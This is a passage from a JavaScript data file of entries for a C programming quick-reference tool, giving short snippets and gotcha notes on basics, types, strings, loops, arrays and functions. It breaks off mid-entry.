/* C quickref — content.
 * To add a concept, copy a block and edit it. Fields:
 *   title  — shown on the card, searched heavily
 *   cat    — one of CATS below
 *   tags   — extra search words
 *   aka    — natural-language phrases people might type
 *   sum    — one-line explanation
 *   code   — the snippet (raw, backslashes are preserved)
 *   note   — optional gotcha / clarification
 *   pop    — optional 0–10 ranking nudge for common concepts
 */
const c = String.raw;

const CATS = [
  "Basics", "Types", "Strings", "Control", "Arrays", "Functions",
  "Pointers", "Memory", "Structs", "Preprocessor", "Files", "Stdlib",
  "Math", "Time", "Threads", "POSIX", "Tooling", "Gotchas",
];

const CONCEPTS = [
  // ---------------------------------------------------------------- Basics
  {
    title: "Hello, world",
    cat: "Basics",
    tags: ["hello", "world", "first", "program", "printf", "main", "start"],
    aka: "write my first program print hello world",
    sum: "The smallest complete C program.",
    code: c`#include <stdio.h>

int main(void) {
    printf("Hello, world!\n");
    return 0;
}`,
    note: "Save as hello.c, then compile with gcc hello.c -o hello and run ./hello.",
    pop: 7,
  },
  {
    title: "Compile and run",
    cat: "Basics",
    tags: ["compile", "gcc", "clang", "build", "run", "make", "executable", "warnings"],
    aka: "how do i build and run a c file",
    sum: "Build a .c file with GCC, then execute it.",
    code: c`gcc -std=c17 -Wall -Wextra main.c -o main
./main`,
    note: "Add -g for debug symbols and -fsanitize=address,undefined to catch memory and UB bugs.",
    pop: 6,
  },
  {
    title: "main signature",
    cat: "Basics",
    tags: ["main", "entry", "point", "argc", "argv", "arguments", "command", "line"],
    aka: "how does main work command line arguments",
    sum: "The entry point. Use void, or accept command-line arguments.",
    code: c`int main(void) {
    return 0;
}

int main(int argc, char *argv[]) {
    // argv[0] is the program name
    // argv[1]..argv[argc-1] are the arguments
    return 0;
}`,
    note: "Returning 0 means success. Returning anything else signals failure to the shell.",
    pop: 5,
  },
  {
    title: "Comments",
    cat: "Basics",
    tags: ["comment", "comments", "annotate", "document", "todo", "disable"],
    aka: "how to write a comment",
    sum: "Line comments with //, block comments with /* */.",
    code: c`// a single line

/* a block
   spanning lines */

int x = 1; // trailing comment`,
  },
  {
    title: "Include a header",
    cat: "Basics",
    tags: ["include", "header", "library", "import", "stdio", "stdlib", "string"],
    aka: "how to import a library use printf",
    sum: "Angle brackets for system headers, quotes for your own.",
    code: c`#include <stdio.h>    // system header
#include "my_header.h" // your project header

int main(void) {
    printf("ok\n");
    return 0;
}`,
    note: "printf lives in stdio.h. malloc and free are in stdlib.h. strlen and strcmp are in string.h.",
    pop: 5,
  },
  {
    title: "Return an exit code",
    cat: "Basics",
    tags: ["return", "exit", "code", "status", "success", "failure", "exit_success"],
    aka: "how to signal success or failure from main",
    sum: "0 means success; nonzero means failure.",
    code: c`#include <stdlib.h>

int main(void) {
    if (something_failed) {
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}`,
    note: "EXIT_SUCCESS is usually 0 and EXIT_FAILURE is usually 1.",
  },
  {
    title: "Random number",
    cat: "Basics",
    tags: ["random", "rand", "srand", "number", "dice", "shuffle", "seed"],
    aka: "how to generate a random number",
    sum: "Seed the generator once, then call rand.",
    code: c`#include <stdlib.h>
#include <time.h>

srand((unsigned)time(NULL));   // seed once

int r = rand() % 100;          // 0..99

// unbiased range:
int r2 = 1 + (int)(100.0 * rand() / (RAND_MAX + 1.0));`,
    note: "rand is fine for games and tests, not for cryptography. Do not call srand repeatedly.",
    pop: 5,
  },
  {
    title: "Sleep or wait",
    cat: "Basics",
    tags: ["sleep", "wait", "delay", "pause", "time", "second", "millisecond"],
    aka: "how to pause the program for a second",
    sum: "POSIX provides sleep and usleep; C11 provides thrd_sleep.",
    code: c`#include <unistd.h>   // POSIX

sleep(1);         // 1 second
usleep(250000);   // 250 milliseconds

// portable C11:
#include <threads.h>
#include <time.h>

struct timespec ts = {.tv_sec = 1};
thrd_sleep(&ts, NULL);`,
    note: "On Windows, Sleep(1000) from windows.h takes milliseconds.",
  },

  // ----------------------------------------------------------------- Types
  {
    title: "Declare an int",
    cat: "Types",
    tags: ["declare", "int", "integer", "number", "whole", "variable", "create"],
    aka: "how to make an integer variable define a number",
    sum: "An int holds a whole number, commonly 32 bits.",
    code: c`int count = 0;
int year = 2026;

int uninitialized; // garbage — initialize before reading`,
    note: "Use long for bigger values and size_t for sizes and indexes.",
    pop: 8,
  },
  {
    title: "Declare a char",
    cat: "Types",
    tags: ["declare", "char", "character", "letter", "single", "byte", "variable", "create"],
    aka: "how to declare a char character letter single character variable",
    sum: "A char stores exactly one character — one byte.",
    code: c`char grade = 'A';
char newline = '\n';

printf("%c\n", grade);`,
    note: "Single quotes make a char; double quotes make a string. char is a small integer type.",
    pop: 10,
  },
  {
    title: "Declare a float or double",
    cat: "Types",
    tags: ["declare", "float", "double", "decimal", "real", "number", "fraction"],
    aka: "how to declare a decimal number floating point",
    sum: "Use double by default; float saves space but loses precision.",
    code: c`float ratio = 0.5f;            // note the f suffix
double precise = 3.141592653589793;

printf("%.2f\n", precise);   // 3.14`,
    note: "A bare 3.14 is a double. Assigning it to float narrows it, so add f.",
    pop: 7,
  },
  {
    title: "Declare a bool",
    cat: "Types",
    tags: ["declare", "bool", "boolean", "true", "false", "flag", "stdbool", "condition"],
    aka: "how to declare a boolean true false variable",
    sum: "C99–C17 need <stdbool.h>; C23 makes bool a keyword.",
    code: c`#include <stdbool.h>

bool ready = true;
bool done = false;

if (ready && !done) {
    puts("go");
}`,
    note: "Before stdbool.h, C had no boolean type; comparisons produce int 0 or 1.",
    pop: 7,
  },
  {
    title: "Declare a constant",
    cat: "Types",
    tags: ["constant", "const", "define", "readonly", "immutable", "max", "value"],
    aka: "how to make a value read only constant variable",
    sum: "Use const for a typed, scoped constant; #define for literal text.",
    code: c`const int MAX_USERS = 100;
const double PI = 3.141592653589793;

#define MAX_LEN 64`,
    note: "const values cannot be assigned after initialization. #define has no type and no scope.",
    pop: 6,
  },
  {
    title: "Declare several variables",
    cat: "Types",
    tags: ["declare", "multiple", "several", "variables", "comma"],
    aka: "declare more than one variable at once",
    sum: "Comma-separate declarations of the same type.",
    code: c`int x = 1, y = 2, z = 3;
int a, b;          // uninitialized
int *p, *q;        // both are pointers

int *r, s;         // r is int*, s is a plain int — beware`,
    note: "The * binds to the name, not the type. One declaration per line is clearer.",
  },
  {
    title: "Size of a type",
    cat: "Types",
    tags: ["sizeof", "size", "bytes", "memory", "type", "length", "byte"],
    aka: "how many bytes is an int how big is a type",
    sum: "sizeof returns the size in bytes as a size_t.",
    code: c`#include <stdio.h>

printf("%zu\n", sizeof(char));    // 1 (always)
printf("%zu\n", sizeof(int));     // usually 4
printf("%zu\n", sizeof(double));  // usually 8
printf("%zu\n", sizeof(int *));   // usually 8 on 64-bit`,
    note: "sizeof is an operator, not a function. It is evaluated at compile time for types.",
    pop: 7,
  },
  {
    title: "Cast a value",
    cat: "Types",
    tags: ["cast", "convert", "conversion", "type", "truncate", "round"],
    aka: "how to convert a type change int to double",
    sum: "Put the target type in parentheses before the value.",
    code: c`int total = 7, count = 2;

double average = (double)total / count;  // 3.5

int truncated = (int)3.99;               // 3 (not rounded)`,
    note: "Casting a pointer to an incompatible type and dereferencing it is undefined behavior.",
    pop: 6,
  },
  {
    title: "Enum",
    cat: "Types",
    tags: ["enum", "enumeration", "named", "constants", "values", "color", "state"],
    aka: "how to make a set of named constants",
    sum: "A set of named integer constants.",
    code: c`enum Color { RED, GREEN, BLUE };   // 0, 1, 2

enum Color c = GREEN;

switch (c) {
case GREEN:
    puts("green");
    break;
default:
    break;
}`,
    note: "Values start at 0 and increment. Assign explicit values when they are persisted.",
    pop: 5,
  },
  {
    title: "typedef",
    cat: "Types",
    tags: ["typedef", "alias", "rename", "type", "shorthand", "struct"],
    aka: "how to create a type alias",
    sum: "Give an existing type a shorter or clearer name.",
    code: c`typedef unsigned long ulong;
typedef struct Point Point;

ulong big = 42UL;
Point p = {1, 2};`,
    note: "typedef does not create a new type — it only adds another name for it.",
    pop: 5,
  },
  {
    title: "Fixed-width integers",
    cat: "Types",
    tags: ["int32_t", "uint64_t", "stdint", "fixed", "width", "exact", "portable", "integer"],
    aka: "how to get an integer with an exact number of bits",
    sum: "stdint.h gives integer types with exact widths.",
    code: c`#include <stdint.h>

int8_t   a = -42;
uint16_t b = 65535;
int32_t  c = -100000;
uint64_t d = 18446744073709551615ULL;`,
    note: "Use these for file formats, network protocols, hashing, and binary data.",
    pop: 4,
  },
  {
    title: "Print values (format specifiers)",
    cat: "Types",
    tags: ["printf", "format", "specifier", "print", "output", "display", "percent", "d", "s"],
    aka: "how to print an int string double pointer with printf",
    sum: "The specifier must match the argument type.",
    code: c`printf("%d\n", 42);           // int
printf("%u\n", 42u);          // unsigned
printf("%ld\n", 42L);         // long
printf("%zu\n", sizeof(int)); // size_t
printf("%f\n", 3.14);         // double
printf("%.2f\n", 3.14159);    // 2 decimals
printf("%c\n", 'A');          // char
printf("%s\n", "hi");         // string
printf("%p\n", (void *)&x);   // pointer
printf("%%\n");               // literal %`,
    note: "A mismatched specifier is undefined behavior. %d with a long or size_t is a common bug.",
    pop: 9,
  },
  {
    title: "Signed vs unsigned",
    cat: "Types",
    tags: ["signed", "unsigned", "overflow", "wrap", "negative", "integer", "comparison"],
    aka: "what does unsigned mean integer overflow",
    sum: "Unsigned wraps around; signed overflow is undefined behavior.",
    code: c`unsigned int u = 0;
u--;                    // wraps to UINT_MAX

int i = -1;
unsigned int v = 1;
if (i < v) { /* false: i is converted to unsigned */ }`,
    note: "Mixing signed and unsigned in a comparison silently converts the signed value to unsigned.",
    pop: 5,
  },

  {
    title: "Bitwise operators",
    cat: "Types",
    tags: ["bitwise", "and", "or", "xor", "not", "shift", "bits", "flags", "hex"],
    aka: "how do bitwise operators work and or xor shift",
    sum: "Operate on the individual bits of integers.",
    code: c`unsigned int x = 0b1010u;   // C23 binary literal

x & 0b1100u;   // AND  -> 1000
x | 0b0001u;   // OR   -> 1011
x ^ 0b1111u;   // XOR  -> 0101
~x;            // NOT  (flips every bit)
x << 2;        // shift left
x >> 2;        // shift right`,
    note: "Shifting by the type width or more is undefined. Prefer unsigned types for bit work.",
    pop: 6,
  },
  {
    title: "Set, clear, or test a bit",
    cat: "Types",
    tags: ["bit", "set", "clear", "toggle", "test", "mask", "flags", "bitwise"],
    aka: "how to set or clear a bit in a number",
    sum: "Use a mask with OR, AND NOT, XOR, and AND.",
    code: c`unsigned int flags = 0;

flags |=  (1u << 3);   // set bit 3
flags &= ~(1u << 3);   // clear bit 3
flags ^=  (1u << 3);   // toggle bit 3

if (flags & (1u << 3)) {
    puts("bit 3 is set");
}`,
    note: "Use 1u so the shift happens in unsigned arithmetic.",
    pop: 5,
  },

  // --------------------------------------------------------------- Strings
  {
    title: "Declare a string",
    cat: "Strings",
    tags: ["declare", "string", "text", "char", "array", "pointer", "literal", "variable", "create"],
    aka: "how to declare a string text variable character array char pointer char*",
    sum: "A string is a char array ending in a NUL byte, '\\0'.",
    code: c`char name[32] = "Ada";       // writable copy (31 chars + '\0')
char *alias = "Ada";         // points at a read-only literal
const char *safe = "Ada";    // same, but the compiler warns on writes`,
    note: "name is your own array, so it can be modified. A string literal must not be modified.",
    pop: 10,
  },
  {
    title: "String literal escapes",
    cat: "Strings",
    tags: ["string", "literal", "escape", "newline", "tab", "quote", "backslash", "special"],
    aka: "how to put a newline or quote inside a string",
    sum: "Backslash escapes insert special characters.",
    code: c`"hello"            // 5 characters + '\0'
"line\n"           // newline
"tab\there"        // tab
"quote: \"hi\""    // double quote
"backslash: \\"    // backslash
"octal: \101"      // 'A'
"hex: \x41"        // 'A'`,
    note: "Adjacent literals concatenate: \"foo\" \"bar\" becomes \"foobar\".",
    pop: 5,
  },
  {
    title: "Read a word with scanf",
    cat: "Strings",
    tags: ["scanf", "read", "input", "word", "string", "stdin", "keyboard"],
    aka: "how to read a string from the user input",
    sum: "scanf with %s stops at whitespace. Always set a width.",
    code: c`char word[32];

if (scanf("%31s", word) == 1) {
    printf("got: %s\n", word);
}`,
    note: "No & before an array — it already decays to a pointer. %31s leaves room for the NUL.",
    pop: 7,
  },
  {
    title: "Read a line with fgets",
    cat: "Strings",
    tags: ["fgets", "read", "line", "input", "stdin", "keyboard", "string", "newline"],
    aka: "how to read a whole line of text including spaces",
    sum: "fgets reads a line safely and keeps the newline if it fits.",
    code: c`char line[256];

if (fgets(line, sizeof line, stdin)) {
    line[strcspn(line, "\n")] = '\0';  // strip trailing newline
    printf("got: %s\n", line);
}`,
    note: "gets was removed from the C standard because it cannot be used safely. Use fgets.",
    pop: 8,
  },
  {
    title: "Read one character",
    cat: "Strings",
    tags: ["getchar", "read", "character", "input", "stdin", "keyboard", "eof"],
    aka: "how to read a single character from input",
    sum: "getchar returns an int so it can return EOF.",
    code: c`int ch = getchar();

if (ch != EOF) {
    putchar(ch);
}

// read until newline:
while ((ch = getchar()) != '\n' && ch != EOF) { }`,
    note: "Store the result in an int, not a char, or you cannot tell EOF apart from a byte.",
    pop: 5,
  },
  {
    title: "String length",
    cat: "Strings",
    tags: ["strlen", "length", "len", "size", "count", "string", "characters"],
    aka: "how long is a string how many characters",
    sum: "strlen counts characters up to the NUL terminator.",
    code: c`#include <string.h>

size_t len = strlen("hello");   // 5

for (size_t i = 0; i < len; i++) {
    putchar("hello"[i]);
}`,
    note: "strlen walks the whole string, so it is O(n). Save the length if you reuse it.",
    pop: 8,
  },
  {
    title: "Copy a string",
    cat: "Strings",
    tags: ["copy", "string", "strcpy", "strncpy", "snprintf", "duplicate", "clone"],
    aka: "how to copy one string into another",
    sum: "snprintf is the easiest safe copy; strcpy does no bounds checking.",
    code: c`char dst[32];

snprintf(dst, sizeof dst, "%s", src);   // safe, always terminated

strcpy(dst, src);                        // unsafe if it does not fit`,
    note: "strncpy may not NUL-terminate when the source is too long. snprintf always does.",
    pop: 7,
  },
  {
    title: "Concatenate strings",
    cat: "Strings",
    tags: ["concat", "concatenate", "append", "join", "strcat", "string", "combine"],
    aka: "how to join two strings together",
    sum: "Append with strncat, or build the result with snprintf.",
    code: c`#include <string.h>

char out[64] = "Hello";

strncat(out, ", world", sizeof out - strlen(out) - 1);

// or:
snprintf(out, sizeof out, "%s%s", "Hello", ", world");`,
    note: "strcat has no bounds check. The n in strncat is the number of characters left, not the buffer size.",
    pop: 5,
  },
  {
    title: "Compare strings",
    cat: "Strings",
    tags: ["compare", "string", "strcmp", "strncmp", "equal", "equality", "same"],
    aka: "how to check if two strings are equal",
    sum: "Use strcmp; == compares pointers, not text.",
    code: c`#include <string.h>

if (strcmp(a, b) == 0) {
    puts("equal");
}

if (strncmp(a, b, 3) == 0) {
    puts("first 3 characters equal");
}`,
    note: "strcmp returns 0 when equal, negative when a < b, positive when a > b.",
    pop: 8,
  },
  {
    title: "Find a substring or character",
    cat: "Strings",
    tags: ["find", "search", "substring", "strstr", "strchr", "character", "index", "locate"],
    aka: "how to search for text inside a string",
    sum: "strstr finds text; strchr finds a character.",
    code: c`char *p = strstr("hello world", "world");
char *q = strchr("hello", 'l');

if (p) {
    printf("found at offset %ld\n", p - "hello world");
}`,
    note: "Both return NULL when there is no match.",
    pop: 6,
  },
  {
    title: "Build a string with snprintf",
    cat: "Strings",
    tags: ["snprintf", "sprintf", "format", "build", "string", "buffer"],
    aka: "how to create a string with variables inside",
    sum: "Format into a buffer of known size.",
    code: c`char buf[64];

int n = snprintf(buf, sizeof buf, "%s: %d", name, score);

if (n < 0 || (size_t)n >= sizeof buf) {
    // encoding error, or the output was truncated
}`,
    note: "snprintf returns the length it wanted, not the length it wrote.",
    pop: 6,
  },
  {
    title: "String to number",
    cat: "Strings",
    tags: ["convert", "string", "number", "atoi", "strtol", "atof", "strtod", "parse", "int"],
    aka: "how to turn a string into an int or double",
    sum: "strtol and strtod can report errors; atoi cannot.",
    code: c`#include <stdlib.h>

int i = atoi("42");
long l = strtol("42", NULL, 10);
double d = atof("3.14");

char *end;
long safe = strtol("42abc", &end, 10);   // 42, end points at "abc"`,
    note: "atoi and atof silently return 0 on bad input. Use strtol or strtod when it matters.",
    pop: 7,
  },
  {
    title: "Number to string",
    cat: "Strings",
    tags: ["convert", "number", "string", "sprintf", "snprintf", "itoa", "format"],
    aka: "how to turn an int into a string",
    sum: "Format it with snprintf. C has no standard itoa.",
    code: c`char buf[32];

snprintf(buf, sizeof buf, "%d", 42);      // "42"
snprintf(buf, sizeof buf, "%f", 3.14);    // "3.140000"`,
    note: "itoa is a common non-standard extension; snprintf is portable.",
    pop: 5,
  },
  {
    title: "Change case (toupper/tolower)",
    cat: "Strings",
    tags: ["uppercase", "lowercase", "upper", "lower", "toupper", "tolower", "case", "capital"],
    aka: "how to convert a string to uppercase or lowercase",
    sum: "ctype.h converts one character at a time.",
    code: c`#include <ctype.h>

char upper = toupper('a');   // 'A'
char lower = tolower('A');   // 'a'

for (char *p = s; *p; p++) {
    *p = toupper((unsigned char)*p);
}`,
    note: "Cast to unsigned char first — passing a negative char to ctype functions is undefined.",
    pop: 5,
  },
  {
    title: "Check a character type",
    cat: "Strings",
    tags: ["isdigit", "isalpha", "isalnum", "isspace", "ctype", "check", "digit", "letter", "character"],
    aka: "how to check if a character is a digit or a letter",
    sum: "ctype.h tests one character at a time and returns nonzero for true.",
    code: c`#include <ctype.h>

char ch = '7';

if (isdigit((unsigned char)ch)) {
    puts("a digit");
}

if (isalpha((unsigned char)ch)) {
    puts("a letter");
}`,
    note: "Always cast to unsigned char first. Related: isalnum, isspace, isupper, ispunct.",
    pop: 5,
  },
  {
    title: "Loop over characters",
    cat: "Strings",
    tags: ["loop", "iterate", "characters", "string", "walk", "nul", "terminator"],
    aka: "how to iterate through every character in a string",
    sum: "Stop at the NUL byte, or use strlen.",
    code: c`for (size_t i = 0; s[i] != '\0'; i++) {
    putchar(s[i]);
}

// pointer version
for (char *p = s; *p; p++) {
    putchar(*p);
}`,
    pop: 5,
  },
  {
    title: "Split a string",
    cat: "Strings",
    tags: ["split", "strtok", "tokenize", "parse", "csv", "delimiter", "string"],
    aka: "how to split a string by commas or spaces",
    sum: "strtok walks a string, replacing delimiters with NUL.",
    code: c`char csv[] = "a,b,c";   // strtok modifies the string

for (char *tok = strtok(csv, ","); tok != NULL; tok = strtok(NULL, ",")) {
    puts(tok);
}`,
    note: "strtok keeps hidden state and is not thread-safe. Use strtok_r when that matters.",
    pop: 6,
  },

  // --------------------------------------------------------------- Control
  {
    title: "if / else",
    cat: "Control",
    tags: ["if", "else", "condition", "branch", "conditional", "test"],
    aka: "how to write an if statement check a condition",
    sum: "Branch on a condition; zero is false, nonzero is true.",
    code: c`if (x > 0) {
    puts("positive");
} else if (x < 0) {
    puts("negative");
} else {
    puts("zero");
}`,
    pop: 8,
  },
  {
    title: "switch",
    cat: "Control",
    tags: ["switch", "case", "break", "default", "branch", "match"],
    aka: "how to use switch case instead of many ifs",
    sum: "Compare one integer or char against several cases.",
    code: c`switch (ch) {
case 'y':
case 'Y':
    puts("yes");
    break;
case 'n':
case 'N':
    puts("no");
    break;
default:
    puts("unknown");
    break;
}`,
    note: "Without break, execution falls through into the next case.",
    pop: 7,
  },
  {
    title: "Ternary operator",
    cat: "Control",
    tags: ["ternary", "conditional", "inline", "question", "colon", "if", "else"],
    aka: "short if else on one line",
    sum: "condition ? value_if_true : value_if_false",
    code: c`int max = a > b ? a : b;

const char *label = (n == 1) ? "item" : "items";`,
    note: "Keep it short. Nested ternaries get unreadable fast.",
    pop: 5,
  },
  {
    title: "while loop",
    cat: "Control",
    tags: ["while", "loop", "repeat", "iterate", "condition"],
    aka: "how to repeat something while a condition is true",
    sum: "Check the condition before each iteration.",
    code: c`int i = 0;

while (i < 5) {
    printf("%d\n", i);
    i++;
}`,
    note: "If the condition starts false, the body never runs.",
    pop: 7,
  },
  {
    title: "do-while loop",
    cat: "Control",
    tags: ["do", "while", "loop", "repeat", "until", "at", "least", "once"],
    aka: "how to run a loop at least once",
    sum: "Run the body, then check the condition.",
    code: c`int n;

do {
    printf("Enter a positive number: ");
    scanf("%d", &n);
} while (n <= 0);`,
    note: "Unlike while, the body runs at least once.",
    pop: 5,
  },
  {
    title: "for loop",
    cat: "Control",
    tags: ["for", "loop", "iterate", "repeat", "count", "index", "loops"],
    aka: "how to do a for loop in c count from 0 to 9",
    sum: "Initialize, test, and increment in one line.",
    code: c`for (int i = 0; i < 10; i++) {
    printf("%d\n", i);
}

// count down
for (int i = 10; i > 0; i--) {
    printf("%d\n", i);
}`,
    note: "i is scoped to the loop in C99 and later. ++i and i++ behave the same here.",
    pop: 10,
  },
  {
    title: "Loop over an array",
    cat: "Control",
    tags: ["loop", "array", "iterate", "foreach", "elements", "index"],
    aka: "how to go through every element of an array",
    sum: "Compute the element count, then index from 0 to n-1.",
    code: c`int nums[] = {3, 1, 4, 1, 5};
size_t n = sizeof nums / sizeof nums[0];

for (size_t i = 0; i < n; i++) {
    printf("%d\n", nums[i]);
}`,
    note: "The last valid index is n - 1, never n.",
    pop: 8,
  },
  {
    title: "Loop backwards",
    cat: "Control",
    tags: ["reverse", "backwards", "backward", "loop", "array", "descending"],
    aka: "how to loop in reverse from the end",
    sum: "Start at the last index and stop after 0.",
    code: c`for (int i = n - 1; i >= 0; i--) {
    printf("%d\n", arr[i]);
}`,
    note: "With size_t, i >= 0 is always true. Use int, or loop while (i-- > 0).",
    pop: 5,
  },
  {
    title: "Infinite loop",
    cat: "Control",
    tags: ["infinite", "forever", "loop", "while", "for", "event", "server"],
    aka: "how to write an endless loop",
    sum: "for (;;) or while (1), with a break to exit.",
    code: c`for (;;) {
    if (should_stop()) {
        break;
    }
    handle_event();
}`,
    note: "An empty condition in a for loop is always true.",
    pop: 4,
  },
  {
    title: "break and continue",
    cat: "Control",
    tags: ["break", "continue", "skip", "exit", "loop", "iteration"],
    aka: "how to skip an iteration or stop a loop early",
    sum: "break exits the loop; continue skips to the next iteration.",
    code: c`for (int i = 0; i < 10; i++) {
    if (i == 3) continue;   // skip 3
    if (i == 8) break;      // stop the loop
    printf("%d\n", i);
}`,
    pop: 6,
  },
  {
    title: "Nested loops",
    cat: "Control",
    tags: ["nested", "loop", "grid", "matrix", "rows", "columns", "2d"],
    aka: "loop inside a loop over rows and columns",
    sum: "One loop per dimension; inner loop runs fully for each outer step.",
    code: c`for (int r = 0; r < rows; r++) {
    for (int c = 0; c < cols; c++) {
        printf("%d ", grid[r][c]);
    }
    putchar('\n');
}`,
    note: "break only exits the innermost loop. Use a flag or goto for deeper exits.",
    pop: 5,
  },
  {
    title: "goto cleanup",
    cat: "Control",
    tags: ["goto", "cleanup", "jump", "label", "error", "exit", "resource"],
    aka: "how to jump to cleanup code on error",
    sum: "C's goto is mainly useful for shared cleanup paths.",
    code: c`if (open_a() != 0) goto cleanup;
if (open_b() != 0) goto cleanup;

// ...
cleanup:
    close_all();
    return status;`,
    note: "Use it sparingly; jumping backwards or across scopes makes code hard to follow.",
  },

  // ---------------------------------------------------------------- Arrays
  {
    title: "Declare an array",
    cat: "Arrays",
    tags: ["declare", "array", "list", "buffer", "elements", "fixed", "size"],
    aka: "how to declare an array of ints",
    sum: "Arrays have a fixed size known at compile time.",
    code: c`int nums[5];              // five uninitialized ints
int zeros[5] = {0};       // all zeros
int vals[] = {1, 2, 3};   // size inferred: 3`,
    note: "C arrays do not store their length. Track it yourself.",
    pop: 9,
  },
  {
    title: "Array length",
    cat: "Arrays",
    tags: ["array", "length", "size", "count", "sizeof", "elements"],
    aka: "how many elements are in this array",
    sum: "Divide the array size by the element size.",
    code: c`int a[10];

size_t n = sizeof a / sizeof a[0];   // 10`,
    note: "This only works while the array type is visible. It fails after the array decays to a pointer.",
    pop: 8,
  },
  {
    title: "Initialize an array",
    cat: "Arrays",
    tags: ["initialize", "array", "values", "zero", "designated", "init"],
    aka: "how to fill an array with values or zeros",
    sum: "Use an initializer list; missing elements become zero.",
    code: c`int a[5] = {1, 2};                 // {1, 2, 0, 0, 0}
int b[5] = {0};                    // all zero
int c[5] = {[0] = 1, [4] = 5};     // designated (C99)`,
    note: "Runtime zeroing needs memset or a loop; initializers only apply at definition.",
    pop: 6,
  },
  {
    title: "Two-dimensional array",
    cat: "Arrays",
    tags: ["2d", "array", "matrix", "grid", "rows", "columns", "table"],
    aka: "how to make a matrix or grid",
    sum: "An array of arrays: grid[row][column].",
    code: c`int grid[3][4] = {
    {1,  2,  3,  4},
    {5,  6,  7,  8},
    {9, 10, 11, 12},
};

printf("%d\n", grid[1][2]);   // 7`,
    note: "Memory is still contiguous, laid out row by row.",
    pop: 5,
  },
  {
    title: "Pass an array to a function",
    cat: "Arrays",
    tags: ["pass", "array", "function", "parameter", "pointer", "length", "decay"],
    aka: "how to give an array to a function",
    sum: "The array decays to a pointer; pass the length too.",
    code: c`void print_all(const int *a, size_t n) {
    for (size_t i = 0; i < n; i++) {
        printf("%d\n", a[i]);
    }
}

print_all(nums, n);`,
    note: "sizeof inside the function gives the pointer size, not the array size.",
    pop: 7,
  },
  {
    title: "Copy an array",
    cat: "Arrays",
    tags: ["copy", "array", "memcpy", "memmove", "duplicate", "clone"],
    aka: "how to copy the contents of an array",
    sum: "memcpy for separate arrays; memmove for overlapping.",
    code: c`#include <string.h>

int dst[5];
memcpy(dst, src, 5 * sizeof dst[0]);

// overlapping ranges:
memmove(arr + 1, arr, 3 * sizeof arr[0]);`,
    note: "An array assignment like dst = src does not copy — it does not even compile.",
    pop: 5,
  },

  {
    title: "Array of strings",
    cat: "Arrays",
    tags: ["array", "strings", "list", "names", "char", "pointer", "table"],
    aka: "how to store a list of strings",
    sum: "Either an array of pointers, or a 2D char array of fixed-width strings.",
    code: c`const char *names[] = {"Ada", "Alan", "Grace"};  // read-only text
char copy[3][16] = {"Ada", "Alan", "Grace"};       // writable copies

for (size_t i = 0; i < 3; i++) {
    puts(names[i]);
}`,
    note: "char *names[] is an array of pointers. char names[][16] is a 2D array of chars.",
    pop: 6,
  },
  {
    title: "Sort an array (qsort)",
    cat: "Arrays",
    tags: ["sort", "qsort", "order", "compare", "callback", "array", "ascending", "structs", "struct", "fields"],
    aka: "how to sort structs by a field with qsort sort an array of ints",
    sum: "qsort needs a comparison function that returns <0, 0, or >0.",
    code: c`#include <stdlib.h>

int cmp_int(const void *a, const void *b) {
    int x = *(const int *)a;
    int y = *(const int *)b;
    return (x > y) - (x < y);
}

int nums[] = {3, 1, 4, 1, 5};
size_t n = sizeof nums / sizeof nums[0];

qsort(nums, n, sizeof nums[0], cmp_int);`,
    note: "The subtraction idiom (x - y) can overflow. Compare with > and < instead.",
    pop: 6,
  },

  // ------------------------------------------------------------- Functions
  {
    title: "Define a function",
    cat: "Functions",
    tags: ["define", "function", "method", "procedure", "call", "parameter", "return"],
    aka: "how to write a function in c",
    sum: "Return type, name, parameters, body.",
    code: c`#include <stdio.h>

int add(int a, int b) {
    return a + b;
}

int main(void) {
    printf("%d\n", add(2, 3));
    return 0;
}`,
    pop: 9,
  },
  {
    title: "Function prototype",
    cat: "Functions",
    tags: ["prototype", "declaration", "forward", "declare", "function", "header"],
    aka: "how to declare a function before using it",
    sum: "A prototype tells the compiler the signature before the definition.",
    code: c`int add(int a, int b);   // prototype

int main(void) {
    return add(1, 2);
}

int add(int a, int b) {  // definition
    return a + b;
}`,
    note: "Put prototypes in a header so every .c file sees the same signature.",
    pop: 6,
  },
  {
    title: "Return from a function",
    cat: "Functions",
    tags: ["return", "void", "early", "value", "function", "exit"],
    aka: "how to return a value or nothing from a function",
    sum: "return exits immediately; void functions may return early.",
    code: c`int clamp(int x, int lo, int hi) {
    if (x < lo) return lo;
    if (x > hi) return hi;
    return x;
}

void log_msg(const char *msg) {
    if (!msg) return;
    printf("%s\n", msg);
}`,
    pop: 5,
  },
  {
    title: "Pass by value",
    cat: "Functions",
    tags: ["pass", "value", "argument", "parameter", "copy", "byval"],
    aka: "why does changing an argument not change my variable",
    sum: "C always passes a copy. Pass a pointer to modify the caller's value.",
    code: c`void bump(int x) {
    x++;            // only the local copy changes
}

int n = 1;
bump(n);            // n is still 1`,
    note: "Arrays look different only because they decay to a pointer; the pointer itself is still passed by value.",
    pop: 7,
  },
  {
    title: "Pass by pointer",
    cat: "Functions",
    tags: ["pass", "pointer", "reference", "modify", "out", "parameter", "address"],
    aka: "how to modify a variable inside a function",
    sum: "Pass the address and dereference it inside.",
    code: c`void bump(int *x) {
    (*x)++;
}

int n = 1;
bump(&n);           // n is now 2`,
    note: "The parentheses matter: *x++ increments the pointer, not the value.",
    pop: 8,
  },
  {
    title: "Swap two variables",
    cat: "Functions",
    tags: ["swap", "exchange", "two", "variables", "pointer", "temp", "temporary"],
    aka: "how to swap two numbers",
    sum: "Pass both addresses and use a temporary.",
    code: c`void swap(int *a, int *b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int x = 1, y = 2;
swap(&x, &y);   // x = 2, y = 1`,
    note: "There are no references in C. A plain swap(int, int) only swaps copies.",
    pop: 6,
  },
  {
    title: "Recursion",
    cat: "Functions",
    tags: ["recursion", "recursive", "factorial", "base", "case", "self", "stack"],
    aka: "how to write a recursive function",
    sum: "A function that calls itself needs a base case.",
    code: c`int fact(int n) {
    if (n <= 1) return 1;       // base case
    return n * fact(n - 1);     // recursive case
}`,
    note: "Each call uses stack space. Deep recursion can overflow the stack.",
    pop: 6,
  },
  {
    title: "static function",
    cat: "Functions",
    tags: ["static", "private", "file", "scope", "function", "internal", "linkage"],
    aka: "how to make a function private to one file",
    sum: "static gives a function internal linkage — visible only in that .c file.",
    code: c`static int helper(int x) {
    return x * 2;
}`,
    note: "static on a local variable has a different meaning: it keeps its value between calls.",
    pop: 4,
  },

  {
    title: "static local variable",
    cat: "Functions",
    tags: ["static", "local", "variable", "persist", "state", "counter", "lifetime"],
